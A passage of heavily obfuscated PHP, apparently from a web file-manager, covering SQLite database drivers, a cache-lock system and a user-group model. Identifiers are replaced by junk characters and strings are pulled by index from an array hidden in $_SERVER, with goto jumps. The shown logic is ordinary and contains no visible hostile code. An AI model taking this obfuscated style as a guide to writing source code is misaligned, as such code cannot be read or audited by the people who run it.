$ÁÀªíÜ¤ => $ö²šÂ¶Ü) { $’öÔ²Ãş[$ÁÀªíÜ¤] = current($ö²šÂ¶Ü); } return $’öÔ²Ãş; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÃÂÅùéø =& $_SERVER[³Ôà×Ó]; $›“‘í£Ä = sqlite_last_error($this->_linkID); $this->error = $›“‘í£Ä . $ÃÂÅùéø[4] . sqlite_error_string($›“‘í£Ä); if ($ÃÂÅùéø[12] != $this->queryStr) { $this->error .= LNG($ÃÂÅùéø[48]) . $this->queryStr; } think_trace($this->error, $ÃÂÅùéø[12], $ÃÂÅùéø[49]); return $this->error; } public function escapeString($ÀÓáÒ ¼) { return sqlite_escape_string($ÀÓáÒ ¼); } public function parseLimit($š³Â¦Ú–) { $¾“¬Š·˜ =& $_SERVER[³Ôà×Ó]; $­£íšÏÍ = $¾“¬Š·˜[12]; if (!empty($š³Â¦Ú–)) { $š³Â¦Ú– = explode($¾“¬Š·˜[50], $š³Â¦Ú–); if (count($š³Â¦Ú–) > 1) { $­£íšÏÍ .= $¾“¬Š·˜[51] . $š³Â¦Ú–[1] . $¾“¬Š·˜[52] . $š³Â¦Ú–[0] . $¾“¬Š·˜[53]; } else { $­£íšÏÍ .= $¾“¬Š·˜[51] . $š³Â¦Ú–[0] . $¾“¬Š·˜[53]; } } return $­£íšÏÍ; } } class DbSqlite3Base extends Db { public function __construct($€Ô±Š„Ö = '') { $°¤àˆ¨ =& $_SERVER[³Ôà×Ó]; if (!class_exists($°¤àˆ¨[54])) { think_exception(think_lang($°¤àˆ¨[14]) . $°¤àˆ¨[55]); } if (!empty($€Ô±Š„Ö)) { if (!isset($€Ô±Š„Ö[$°¤àˆ¨[16]])) { $€Ô±Š„Ö[$°¤àˆ¨[16]] = 438; } $this->config = $€Ô±Š„Ö; if (empty($this->config[$°¤àˆ¨[17]])) { $this->config[$°¤àˆ¨[17]] = array(); } } } public function connect($åÛöÖÌ¯ = '', $Ä‚Ä¬ë¤ = 0) { $İøÊ—ï =& $_SERVER[³Ôà×Ó]; if (!isset($this->linkID[$Ä‚Ä¬ë¤])) { if (empty($åÛöÖÌ¯)) { $åÛöÖÌ¯ = $this->config; } $this->linkID[$Ä‚Ä¬ë¤] = new SQLite3($åÛöÖÌ¯[$İøÊ—ï[21]]); if (!$this->linkID[$Ä‚Ä¬ë¤]) { think_exception($this->linkID[$Ä‚Ä¬ë¤]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ä‚Ä¬ë¤]->busyTimeout(30000); if (1 != think_config($İøÊ—ï[22])) { unset($this->config); } } return $this->linkID[$Ä‚Ä¬ë¤]; } public function free() { $this->queryID = null; } public function query($•ôÚÄş±) { $ÑÜá×´Æ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•ôÚÄş±; if ($this->queryID) { $this->free(); } think_action_status($ÑÜá×´Æ[23], 1); think_status($ÑÜá×´Æ[24]); $this->queryID = $this->_linkID->query($•ôÚÄş±); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ş°ºõÙˆ = $this->getAll(); $this->numRows = count($ş°ºõÙˆ); return $ş°ºõÙˆ; } } public function execute($›ó°Ğ¦æ) { $Ó°òÅÂ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›ó°Ğ¦æ; if ($this->queryID) { $this->free(); } think_action_status($Ó°òÅÂ[25], 1); think_status($Ó°òÅÂ[24]); $ˆë•¨Í± = $this->_linkID->exec($›ó°Ğ¦æ); $this->debug(); if (!1 === $ˆë•¨Í±) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[³Ôà×Ó][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ «ÏÒœ = $this->_linkID->query($_SERVER[³Ôà×Ó][27]); if (!$ «ÏÒœ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $áÚçì¦Æ = $this->_linkID->query($_SERVER[³Ôà×Ó][28]); if (!$áÚçì¦Æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $œÁÊÆÃ = array(); while ($†¼ƒ›‡Ò = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $œÁÊÆÃ[] = $†¼ƒ›‡Ò; } $this->queryID->reset(); return $œÁÊÆÃ; } public function getFields($õş¤è÷—) { $´”ÀÊ =& $_SERVER[³Ôà×Ó]; $ÑâûúÀÎ = $this->query($´”ÀÊ[29] . $õş¤è÷— . $´”ÀÊ[30]); $“ŠÔˆç— = array(); if ($ÑâûúÀÎ) { foreach ($ÑâûúÀÎ as $ ù­Èô• => $½Ñ¯¿Û) { $“ŠÔˆç—[$½Ñ¯¿Û[$´”ÀÊ[32]]] = array($´”ÀÊ[32] => $½Ñ¯¿Û[$´”ÀÊ[32]], $´”ÀÊ[33] => $½Ñ¯¿Û[$´”ÀÊ[33]], $´”ÀÊ[35] => (bool) ($½Ñ¯¿Û[$´”ÀÊ[35]] === $´”ÀÊ[12]), $´”ÀÊ[37] => $½Ñ¯¿Û[$´”ÀÊ[56]], $´”ÀÊ[39] => (bool) $½Ñ¯¿Û[$´”ÀÊ[57]], $´”ÀÊ[42] => (bool) $½Ñ¯¿Û[$´”ÀÊ[57]]); } } return $“ŠÔˆç—; } public function getTables($ˆîòù = '') { $¸§ßÄş¨ =& $_SERVER[³Ôà×Ó]; $—ƒ«íà = $this->query($¸§ßÄş¨[45] . $¸§ßÄş¨[46] . $¸§ßÄş¨[47]); $ä×ï Ï¢ = array(); foreach ($—ƒ«íà as $÷œã½… => $»ÜÄıöÅ) { $ä×ï Ï¢[$÷œã½…] = current($»ÜÄıöÅ); } return $ä×ï Ï¢; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ñ»·ˆ =& $_SERVER[³Ôà×Ó]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ñ»·ˆ[12] != $this->queryStr) { $this->error .= LNG($Ñ»·ˆ[48]) . $this->queryStr; } think_trace($this->error, $Ñ»·ˆ[12], $Ñ»·ˆ[49]); return $this->error; } public function escapeString($¥¦ÒïÄ·) { $¯È§”œ =& $_SERVER[³Ôà×Ó]; if ($this->_linkID) { return $this->_linkID->escapeString($¥¦ÒïÄ·); } return str_ireplace($¯È§”œ[58], $¯È§”œ[59], $¥¦ÒïÄ·); } public function parseLimit($í¸Ââ¤ã) { $©™úšÅÄ =& $_SERVER[³Ôà×Ó]; $ÛÀ´İ«Æ = $©™úšÅÄ[12]; if (!empty($í¸Ââ¤ã)) { $í¸Ââ¤ã = explode($©™úšÅÄ[50], $í¸Ââ¤ã); if (count($í¸Ââ¤ã) > 1) { $ÛÀ´İ«Æ .= $©™úšÅÄ[51] . $í¸Ââ¤ã[1] . $©™úšÅÄ[52] . $í¸Ââ¤ã[0] . $©™úšÅÄ[53]; } else { $ÛÀ´İ«Æ .= $©™úšÅÄ[51] . $í¸Ââ¤ã[0] . $©™úšÅÄ[53]; } } return $ÛÀ´İ«Æ; } } goto A‚‘©¨Ä³; eÎ™‚Şñ¡: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $É£©ëğ =& $_SERVER[³Ôà×Ó]; if (self::$handle) { return self::$handle; } $‹ÌğÓ³‘ = $GLOBALS[$É£©ëğ[6]][$É£©ëğ[425]]; self::$timeout = $‹ÌğÓ³‘[$É£©ëğ[915]] ? $‹ÌğÓ³‘[$É£©ëğ[915]] : 10; $åÍ—™Îí = _get($GLOBALS[$É£©ëğ[6]], $É£©ëğ[916]); $ûİ½ôïˆ = $‹ÌğÓ³‘[$É£©ëğ[901]] ? $‹ÌğÓ³‘[$É£©ëğ[901]] : $É£©ëğ[230]; if ($ûİ½ôïˆ == $É£©ëğ[21] && $åÍ—™Îí == $É£©ëğ[13]) { $ûİ½ôïˆ = $É£©ëğ[230]; } switch ($ûİ½ôïˆ) { case $É£©ëğ[904]: self::$handle = new CacheLockRedis(); break; case $É£©ëğ[905]: self::$handle = new CacheLockMemcached(); break; case $É£©ëğ[21]: self::$handle = new CacheLockDatabase(); break; case $É£©ëğ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($É£©ëğ[917], $É£©ëğ[918]); } return self::$handle; } private static function key($ûû»Õæ) { return $_SERVER[³Ôà×Ó][919] . Cache::key($ûû»Õæ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¾—Í©¥é = '') { self::$errorMsg = $¾—Í©¥é; } public static function lockGlobal($ŠÛö…÷, $‰õ¼¨Ÿ) { return self::lock($ŠÛö…÷, $‰õ¼¨Ÿ, !0); } public static function lock($šÔû†È, $Ë¹ËúşŸ = false, $–ÈÙ€Å = false) { $¯‰áøÒ— =& $_SERVER[³Ôà×Ó]; $û®¼¦šñ = self::init(); $¿Û©‡ã = self::key($šÔû†È); $Ë¹ËúşŸ = $Ë¹ËúşŸ ? $Ë¹ËúşŸ : self::$timeout; $Ó’ééšñ = timeFloat(); $åÖ‹ñá = $û®¼¦šñ->lock($¿Û©‡ã, $Ë¹ËúşŸ); $Õé‚áÀú = timeFloat(); if (!$åÖ‹ñá) { $”œ¯ = "\x6c\157\143\153\x20\145\162\x72\157\x72\x3b\x6b\145\171\75{$šÔû†È}\73\x74\x69\155\x65\x3d{$Ë¹ËúşŸ}\x3b" . self::$errorMsg . $¯‰áøÒ—[74] . get_caller_msg(); $÷Ÿ¨Óéá = LNG($¯‰áøÒ—[920]) . "\50{$Ë¹ËúşŸ}\163\51\x2e" . LNG($¯‰áøÒ—[921]); $÷Ÿ¨Óéá .= $¯‰áøÒ—[922]; if (is_string(self::$errorMsg) && self::$errorMsg) { $÷Ÿ¨Óéá = $÷Ÿ¨Óéá . $¯‰áøÒ—[923] . self::$errorMsg; } write_log($¯‰áøÒ—[924] . sprintf($¯‰áøÒ—[925], timeFloat() - $Ó’ééšñ) . $¯‰áøÒ—[926] . $”œ¯ . $¯‰áøÒ—[927] . error_get_last(), $¯‰áøÒ—[918]); show_json($÷Ÿ¨Óéá, !1); } if (!$–ÈÙ€Å) { self::$lockItem[$¿Û©‡ã] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ô™³æ±Ş = number_format(timeFloat() - $Õé‚áÀú, 3); write_log($¯‰áøÒ—[928] . $šÔû†È . $¯‰áøÒ—[929] . $ô™³æ±Ş, $¯‰áøÒ—[918]); } return $åÖ‹ñá; } public static function lockGet($³˜Ëê·˜) { $œ‹ƒ£Œ = self::key($³˜Ëê·˜); if (self::$lockItem[$œ‹ƒ£Œ]) { return self::$lockItem[$œ‹ƒ£Œ]; } return self::init()->lockGet($œ‹ƒ£Œ); } public static function unlock($‹¡ã¥ñè) { $•¼—Éöã =& $_SERVER[³Ôà×Ó]; $ûÁÅáÌñ = self::key($‹¡ã¥ñè); self::$lockItem[$ûÁÅáÌñ] = null; self::init()->unlock($ûÁÅáÌñ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($•¼—Éöã[930] . $‹¡ã¥ñè, $•¼—Éöã[918]); } return; } public static function unlockRuntime() { $¸ØıÆó =& $_SERVER[³Ôà×Ó]; $óıªˆ‰Ã = self::init(); $Ô„Òî´ = !1; foreach (self::$lockItem as $Ö…‹îå => $¤´‘¤ùÀ) { if (!$¤´‘¤ùÀ) { continue; } $óıªˆ‰Ã->unlock($Ö…‹îå); if (!$Ô„Òî´) { $Ô„Òî´ = !0; write_log($¸ØıÆó[931] . $Ö…‹îå . $¸ØıÆó[74] . get_caller_msg(), $¸ØıÆó[918]); continue; } write_log($¸ØıÆó[931] . $Ö…‹îå, $¸ØıÆó[918]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÜÔ¢úÇ² = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¸ØıÆó[932] . $ÜÔ¢úÇ² . $¸ØıÆó[933] . ACTION, $¸ØıÆó[918]); } } public static function fileLock($ÕÛú®Á„) { $‘ïçŠ¶¿ =& $_SERVER[³Ôà×Ó]; if (!$GLOBALS[$‘ïçŠ¶¿[934]]) { $GLOBALS[$‘ïçŠ¶¿[934]] = array(); } $GLOBALS[$‘ïçŠ¶¿[934]][$ÕÛú®Á„] = !1; $á¼¢äíœ = fopen(DATA_PATH . $ÕÛú®Á„ . $‘ïçŠ¶¿[935], $‘ïçŠ¶¿[936]); if (!$á¼¢äíœ) { return !1; } $GLOBALS[$‘ïçŠ¶¿[934]][$ÕÛú®Á„] = $á¼¢äíœ; if (flock($á¼¢äíœ, LOCK_EX)) { return !0; } self::unlock($ÕÛú®Á„); show_json($‘ïçŠ¶¿[937], !1); return !1; } public static function fileUnlock($§Ÿ‹åà×) { $µëÎ°ñ¡ =& $_SERVER[³Ôà×Ó]; $„óŸˆ«ß = $GLOBALS[$µëÎ°ñ¡[934]][$§Ÿ‹åà×]; if (!$„óŸˆ«ß) { return; } $GLOBALS[$µëÎ°ñ¡[934]][$§Ÿ‹åà×] = !1; flock($„óŸˆ«ß, LOCK_UN); fclose($„óŸˆ«ß); } public static function fileUnlockAll() { $Üüˆ¬áÑ =& $_SERVER[³Ôà×Ó]; if (!isset($GLOBALS[$Üüˆ¬áÑ[934]]) || !$GLOBALS[$Üüˆ¬áÑ[934]]) { return; } foreach ($GLOBALS[$Üüˆ¬áÑ[934]] as $†òà…£Õ => $ÎåâÊ±Ğ) { if (!$ÎåâÊ±Ğ) { continue; } $GLOBALS[$Üüˆ¬áÑ[934]][$†òà…£Õ] = !1; flock($ÎåâÊ±Ğ, LOCK_UN); fclose($ÎåâÊ±Ğ); } $GLOBALS[$Üüˆ¬áÑ[934]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $åÚµí±¬ =& $_SERVER[³Ôà×Ó]; $²Ù›ş·´ = $GLOBALS[$åÚµí±¬[6]][$åÚµí±¬[425]]; self::$cachePath = $²Ù›ş·´[$åÚµí±¬[230]][$åÚµí±¬[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($”¯Òš, $Ä¤ÊäÎ = 0) { $ÖøŒÕüÅ =& $_SERVER[³Ôà×Ó]; $âúûŸÉ = microtime(!0); $¶Â¶ôµø = $âúûŸÉ + $Ä¤ÊäÎ + 0.0001; $õ±İ¶Ìö = rtrim(self::$cachePath, $ÖøŒÕüÅ[8]) . $ÖøŒÕüÅ[938] . md5($”¯Òš) . $ÖøŒÕüÅ[935]; if (file_exists($õ±İ¶Ìö) && filemtime($õ±İ¶Ìö) && filemtime($õ±İ¶Ìö) < time() - 10) { @unlink($õ±İ¶Ìö); } do { if (file_exists($õ±İ¶Ìö)) { cacheLockWait(); continue; } $ğßøğû« = fopen($õ±İ¶Ìö, $ÖøŒÕüÅ[939]); if (!$ğßøğû«) { return !1; } $µÅæ‘²™ = flock($ğßøğû«, LOCK_EX | LOCK_NB); self::$caches[$”¯Òš] = array($ÖøŒÕüÅ[940] => $ğßøğû«, $ÖøŒÕüÅ[230] => $õ±İ¶Ìö); fwrite($ğßøğû«, $¶Â¶ôµø); clearstatcache(); if ($ğßøğû« && $µÅæ‘²™) { return !0; } cacheLockWait(); } while (microtime(!0) < $¶Â¶ôµø); $this->unlock($”¯Òš); return !1; } public function lockGet($ìÉıÀ) { $È–¸Ï× =& $_SERVER[³Ôà×Ó]; $á¨…§È¼ = rtrim(self::$cachePath, $È–¸Ï×[8]) . $È–¸Ï×[938] . md5($ìÉıÀ) . $È–¸Ï×[935]; return file_exists($á¨…§È¼); } public function unlock($ô€¶–Êã) { $¿åËáÎô =& $_SERVER[³Ôà×Ó]; $³¨‡‘Íå = self::$caches[$ô€¶–Êã]; if (!$³¨‡‘Íå) { return; } @flock($³¨‡‘Íå[$¿åËáÎô[940]], LOCK_UN); @fclose($³¨‡‘Íå[$¿åËáÎô[940]]); @unlink($³¨‡‘Íå[$¿åËáÎô[230]]); unset(self::$caches[$ô€¶–Êã]); } } goto D¤ÉˆÄÔ; aÑ…˜ìåğ: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\155\x65" => "\x67\x72\x6f\165\160\137\x6d\x65\x74\x61", "\155\x65\x74\141\x46\x69\x65\154\144" => "\147\162\x6f\165\160\111\104"); protected function cacheFunctionAlias($°àáï°) { $¸¤éú‘ =& $_SERVER[³Ôà×Ó]; return array($¸¤éú‘[2045] => array($°àáï°[0], $¸¤éú‘[2046]), $¸¤éú‘[2047] => array($°àáï°[0], $¸¤éú‘[2048])); } protected function getInfo($˜ä¤Š×–, $Éç©ÓğÓ = false) { $ƒ´ã­Şè = $this->getInfoSimple($˜ä¤Š×–); if (!$ƒ´ã­Şè) { return !1; } if ($Éç©ÓğÓ) { return $this->_listDataApplyItem($ƒ´ã­Şè); } return $this->cacheFunctionGet($_SERVER[³Ôà×Ó][2049], $˜ä¤Š×–); } protected function getInfoSimple($•ÓİŸÚá, $‰ûÓ³ØŸ = false) { $¼Î£ßÌµ =& $_SERVER[³Ôà×Ó]; if ($‰ûÓ³ØŸ) { $ÃàòÀûŠ = array($¼Î£ßÌµ[1963] => intval($•ÓİŸÚá)); $şø„„£ú = $this->where($ÃàòÀûŠ)->find(); return is_array($şø„„£ú) ? $şø„„£ú : array(); } return $this->cacheFunctionGet($¼Î£ßÌµ[2050], $•ÓİŸÚá); } protected function groupAdd($Ó·¼ì³µ) { $¬›šîÙ =& $_SERVER[³Ôà×Ó]; if (!$Ó·¼ì³µ[$¬›šîÙ[192]] && isset($Ó·¼ì³µ[$¬›šîÙ[1963]]) && $Ó·¼ì³µ[$¬›šîÙ[1963]] == 1) { if ($éæúñ¼‡ = $this->getInfoSimple($Ó·¼ì³µ[$¬›šîÙ[1963]], !0)) { return $Ó·¼ì³µ[$¬›šîÙ[1963]]; } } else { $éæúñ¼‡ = $this->getInfoSimple($Ó·¼ì³µ[$¬›šîÙ[192]]); if (!$éæúñ¼‡) { return !1; } } $ŠÊæù¾µ = $¬›šîÙ[603]; if ($éæúñ¼‡[$¬›šîÙ[593]]) { $ŠÊæù¾µ = $éæúñ¼‡[$¬›šîÙ[593]] . $éæúñ¼‡[$¬›šîÙ[1963]] . $¬›šîÙ[50]; } $ºã“ª¤– = array($¬›šîÙ[503] => $this->groupNameAuto($Ó·¼ì³µ[$¬›šîÙ[192]], $Ó·¼ì³µ[$¬›šîÙ[32]]), $¬›šîÙ[486] => $Ó·¼ì³µ[$¬›šîÙ[192]], $¬›šîÙ[661] => $ŠÊæù¾µ, $¬›šîÙ[2051] => $Ó·¼ì³µ[$¬›šîÙ[1950]], $¬›šîÙ[2052] => 0, $¬›šîÙ[1967] => 0); if (isset($Ó·¼ì³µ[$¬›šîÙ[1987]])) { $ºã“ª¤–[$¬›šîÙ[1987]] = $Ó·¼ì³µ[$¬›šîÙ[1987]]; } else { $Š®ÃŸ½ = $this->max($¬›šîÙ[1987]); if (!$Š®ÃŸ½) { $Š®ÃŸ½ = 0; } $ºã“ª¤–[$¬›šîÙ[1987]] = $Š®ÃŸ½ + 1; } if (!empty($Ó·¼ì³µ[$¬›šîÙ[1963]])) { $ºã“ª¤–[$¬›šîÙ[1963]] = $Ó·¼ì³µ[$¬›šîÙ[1963]]; } $¶¾Õìİ© = $this->add($ºã“ª¤–); $this->setNamePinyin($¶¾Õìİ©, $ºã“ª¤–[$¬›šîÙ[32]]); if (isset($Ó·¼ì³µ[$¬›šîÙ[2053]])) { $this->metaSet($¶¾Õìİ©, array($¬›šîÙ[2053] => $Ó·¼ì³µ[$¬›šîÙ[2053]], $¬›šîÙ[2054] => $Ó·¼ì³µ[$¬›šîÙ[2054]])); unset($Ó·¼ì³µ[$¬›šîÙ[2053]]); unset($Ó·¼ì³µ[$¬›šîÙ[2054]]); } Model($¬›šîÙ[1414])->groupRootAdd($¶¾Õìİ©); $this->_clearCache($Ó·¼ì³µ[$¬›šîÙ[192]]); return $¶¾Õìİ©; } protected function groupEdit($”Óôßµ˜, $úí‘—ŸŠ) { $¿¢¶ô¨¡ =& $_SERVER[³Ôà×Ó]; $ã™ÎàŠî = $this->getInfoSimple($”Óôßµ˜); if (!$ã™ÎàŠî) { return !1; } if (!empty($úí‘—ŸŠ[$¿¢¶ô¨¡[192]])) { $êÉû›¡ = $this->getInfoSimple($úí‘—ŸŠ[$¿¢¶ô¨¡[192]]); if (!$êÉû›¡) { return !1; } if ($ã™ÎàŠî[$¿¢¶ô¨¡[1963]] == $êÉû›¡[$¿¢¶ô¨¡[1963]]) { return !1; } if ($úí‘—ŸŠ[$¿¢¶ô¨¡[192]] != $ã™ÎàŠî[$¿¢¶ô¨¡[192]]) { if ($êÉû›¡[$¿¢¶ô¨¡[593]] !== $ã™ÎàŠî[$¿¢¶ô¨¡[593]] && strpos($êÉû›¡[$¿¢¶ô¨¡[593]], $ã™ÎàŠî[$¿¢¶ô¨¡[593]] . $ã™ÎàŠî[$¿¢¶ô¨¡[1963]] . $¿¢¶ô¨¡[50]) === 0) { return !1; } $úí‘—ŸŠ[$¿¢¶ô¨¡[661]] = $êÉû›¡[$¿¢¶ô¨¡[593]] . $úí‘—ŸŠ[$¿¢¶ô¨¡[192]] . $¿¢¶ô¨¡[50]; $this->_changeChildLevel($ã™ÎàŠî, $êÉû›¡); $this->_clearCache($êÉû›¡[$¿¢¶ô¨¡[1963]]); $this->_clearCache($ã™ÎàŠî[$¿¢¶ô¨¡[192]]); } } if (isset($úí‘—ŸŠ[$¿¢¶ô¨¡[32]])) { $this->setNamePinyin($”Óôßµ˜, $úí‘—ŸŠ[$¿¢¶ô¨¡[32]]); } if (isset($úí‘—ŸŠ[$¿¢¶ô¨¡[2053]])) { $this->metaSet($”Óôßµ˜, array($¿¢¶ô¨¡[2053] => $úí‘—ŸŠ[$¿¢¶ô¨¡[2053]], $¿¢¶ô¨¡[2054] => $úí‘—ŸŠ[$¿¢¶ô¨¡[2054]])); unset($úí‘—ŸŠ[$¿¢¶ô¨¡[2053]]); unset($úí‘—ŸŠ[$¿¢¶ô¨¡[2054]]); } $this->_clearChildrenCache($ã™ÎàŠî); return $this->where(array($¿¢¶ô¨¡[2055] => $”Óôßµ˜))->save($úí‘—ŸŠ); } private function _clearChildrenCache($¸©‡¬¬‰) { $˜Ñ·ù¬ì =& $_SERVER[³Ôà×Ó]; $†¸ï¿³â = array($˜Ñ·ù¬ì[661] => array($˜Ñ·ù¬ì[621], $¸©‡¬¬‰[$˜Ñ·ù¬ì[593]] . $¸©‡¬¬‰[$˜Ñ·ù¬ì[1963]] . $˜Ñ·ù¬ì[622])); $¿®·§å = $this->field($˜Ñ·ù¬ì[1963])->where($†¸ï¿³â)->select(); foreach ($¿®·§å as $Š£é°¤) { $this->_clearCache($Š£é°¤[$˜Ñ·ù¬ì[1963]]); } } private function _clearCache($¨ñ™•Ûõ) { $¢˜Ì²æ’ =& $_SERVER[³Ôà×Ó]; $this->cacheFunctionClear($¢˜Ì²æ’[2049], $¨ñ™•Ûõ); $this->cacheFunctionClear($¢˜Ì²æ’[2050], $¨ñ™•Ûõ); } private function _changeChildLevel($¥½ÂœÏù, $…†’„ø, $è‚ûî‰° = false) { $ù Âˆã =& $_SERVER[³Ôà×Ó]; $åª„ºÉà = $¥½ÂœÏù[$ù Âˆã[593]] . $¥½ÂœÏù[$ù Âˆã[1963]] . $ù Âˆã[50]; $©½äŒ”« = $…†’„ø[$ù Âˆã[593]] . $…†’„ø[$ù Âˆã[1963]] . $ù Âˆã[50] . $¥½ÂœÏù[$ù Âˆã[1963]] . $ù Âˆã[50]; if ($è‚ûî‰°) { $©½äŒ”« = $…†’„ø[$ù Âˆã[593]] . $…†’„ø[$ù Âˆã[1963]] . $ù Âˆã[50]; } $¬ÅÏàœş = array($ù Âˆã[661] => array($ù Âˆã[621], $¥½ÂœÏù[$ù Âˆã[593]] . $¥½ÂœÏù[$ù Âˆã[1963]] . $ù Âˆã[622])); $±¯Ñ”Ú… = array($ù Âˆã[661] => array($ù Âˆã[670], "\162\145\x70\154\x61\143\x65\50\160\x61\162\x65\156\164\x4c\x65\166\x65\154\x2c\x27{$åª„ºÉà}\x27\x2c\47{$©½äŒ”«}\x27\51")); $this->_clearChildrenCache($¥½ÂœÏù); $this->where($¬ÅÏàœş)->data($±¯Ñ”Ú…)->save(); } public function setNamePinyin($Íò•îô«, $Öªê¸ø = false) { $¶éÊİ· =& $_SERVER[³Ôà×Ó]; if (!$Öªê¸ø) { $¡¹ …°ò = $this->getInfoSimple($Íò•îô«); $Öªê¸ø = $¡¹ …°ò[$¶éÊİ·[32]]; } if (!Input::check($Öªê¸ø, $¶éÊİ·[664])) { $this->metaSet($Íò•îô«, $¶éÊİ·[547], null); $this->metaSet($Íò•îô«, $¶éÊİ·[546], null); return; } $é•ë¬¿­ = array($¶éÊİ·[547] => str_replace($¶éÊİ·[53], $¶éÊİ·[12], Pinyin::get($Öªê¸ø)), $¶éÊİ·[546] => Pinyin::get($Öªê¸ø, $¶éÊİ·[665])); $this->metaSet($Íò•îô«, $é•ë¬¿­); } protected function groupStatus($Ü’Ï×è´, $¸Éõºå) { $³ø´‹Ê =& $_SERVER[³Ôà×Ó]; $Ïµ°ƒò„ = $this->getInfoSimple($Ü’Ï×è´); if (!$Ïµ°ƒò„) { return !1; } $this->_clearCache($Ü’Ï×è´); return $this->metaSet($Ü’Ï×è´, $³ø´‹Ê[825], $¸Éõºå); if ($¸Éõºå == $³ø´‹Ê[91]) { $Ù¶“É¶ = $this->parentLevelArray($Ïµ°ƒò„[$³ø´‹Ê[593]]); } else { } $Ù¶“É¶[] = $Ïµ°ƒò„[$³ø´‹Ê[1963]]; $›öŠĞ‚» = array(); foreach ($Ù¶“É¶ as $Ü’Ï×è´) { $›öŠĞ‚»[] = array($³ø´‹Ê[1963] => $Ü’Ï×è´, $³ø´‹Ê[97] => $³ø´‹Ê[825], $³ø´‹Ê[459] => $¸Éõºå); $this->_clearCache($Ü’Ï×è´); } return Model($³ø´‹Ê[2056])->addAll($›öŠĞ‚», array(), !0); } protected function groupRemove($ öšˆ–š, $ú©˜ÇĞ› = false) { $³ğìóÆî =& $_SERVER[³Ôà×Ó]; $Êœ“  ì = array($³ğìóÆî[1963] => $ öšˆ–š); $õ­’èÍ“ = $this->where($Êœ“  ì)->find(); if (!$õ­’èÍ“ || $õ­’èÍ“[$³ğìóÆî[192]] == 0) { return !1; } if (!$ú©˜ÇĞ›) { $´òÏƒ¶ = $this->getInfoSimple($õ­’èÍ“[$³ğìóÆî[192]]); $this->_changeChildLevel($õ­’èÍ“, $´òÏƒ¶, !0); $this->where(array($³ğìóÆî[192] => $ öšˆ–š))->save(array($³ğìóÆî[192] => $õ­’èÍ“[$³ğìóÆî[192]])); $this->_clearCache($´òÏƒ¶[$³ğìóÆî[1963]]); } Model($³ğìóÆî[2056])->where($Êœ“  ì)->delete(); Model($³ğìóÆî[2057])->where($Êœ“  ì)->delete(); Model($³ğìóÆî[899])->groupRootRemove($ öšˆ–š); $this->_clearCache($õ­’èÍ“[$³ğìóÆî[192]]); return $this->where($Êœ“  ì)->delete(); } protected function groupSort($±ˆ³¨‰†) { $ óòüèÄ =& $_SERVER[³Ôà×Ó]; $†¾óéì¬ = array(); foreach ($±ˆ³¨‰† as $•àú‹í => $øæü—) { $†¾óéì¬[] = array($ óòüèÄ[1963], $øæü—, $ óòüèÄ[1987], $•àú‹í + 1); } $this->saveAll($†¾óéì¬); } public function listData() { $Éà¹¨Ğ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Éà¹¨Ğ[$_SERVER[³Ôà×Ó][454]]); return $Éà¹¨Ğ; } private function _makeOrder($¡Õº—âä = '') { $š°ß¡œ¥ =& $_SERVER[³Ôà×Ó]; $Â€ØùÈÒ = array($š°ß¡œ¥[1963], $š°ß¡œ¥[32], $š°ß¡œ¥[1952], $š°ß¡œ¥[231]); $°ØÜÖ¾ = array($š°ß¡œ¥[532] => $š°ß¡œ¥[533], $š°ß¡œ¥[534] => $š°ß¡œ¥[535]); $ÅÍ˜ºß£ = Input::get($š°ß¡œ¥[539], $š°ß¡œ¥[7], $š°ß¡œ¥[1967], $Â€ØùÈÒ); $û¡ÀÜÊ¯ = Input::get($š°ß¡œ¥[540], $š°ß¡œ¥[7], $š°ß¡œ¥[2058], array($š°ß¡œ¥[2058], $š°ß¡œ¥[534])); $û¡ÀÜÊ¯ = $°ØÜÖ¾[$û¡ÀÜÊ¯]; $¡Õº—âä = $¡Õº—âä . "{$ÅÍ˜ºß£}\40{$û¡ÀÜÊ¯}\x2c\40\147\162\x6f\x75\160\x49\x44\x20\x61\163\x63"; return $this->order($¡Õº—âä); } public function listChild($½’‚”½) { $à÷¹àÔ› =& $_SERVER[³Ôà×Ó]; $ı¤ğİ… = $this->where(array($à÷¹àÔ›[192] => $½’‚”½))->_makeOrder()->selectPage(200); $this->_listDataApply($ı¤ğİ…[$à÷¹àÔ›[454]]); return $ı¤ğİ…; } public function listChildIds($¶Ş‚ıÑ) { $ôÒŠ»ƒ =& $_SERVER[³Ôà×Ó]; if (is_string($·¨ƒÊ)) { $¶Ş‚ıÑ = explode($ôÒŠ»ƒ[50], $¶Ş‚ıÑ); } $…®èì±Ê = $this->where(array($ôÒŠ»ƒ[1963] => 